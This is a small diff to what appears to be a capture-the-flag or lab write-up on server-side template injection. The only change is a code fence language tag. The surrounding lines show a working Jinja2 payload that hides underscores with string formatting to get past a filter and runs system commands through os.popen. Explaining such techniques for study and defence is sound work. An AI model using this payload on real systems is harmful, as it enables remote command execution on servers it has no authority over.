@@ -42,7 +42,7 @@ We can use a simple SSTI payload to execute and display arbitrary system command
 
 To bypass the `_` filter, we can use Jinja2 string formatting to obfuscate our payload.  
 
-```
+```python
 {{cycler["%c%cinit%c%c"|format(95,95,95,95)]["%c%cglobals%c%c"|format(95,95,95,95)]['os'].popen('ls').read()}}
 ```
 
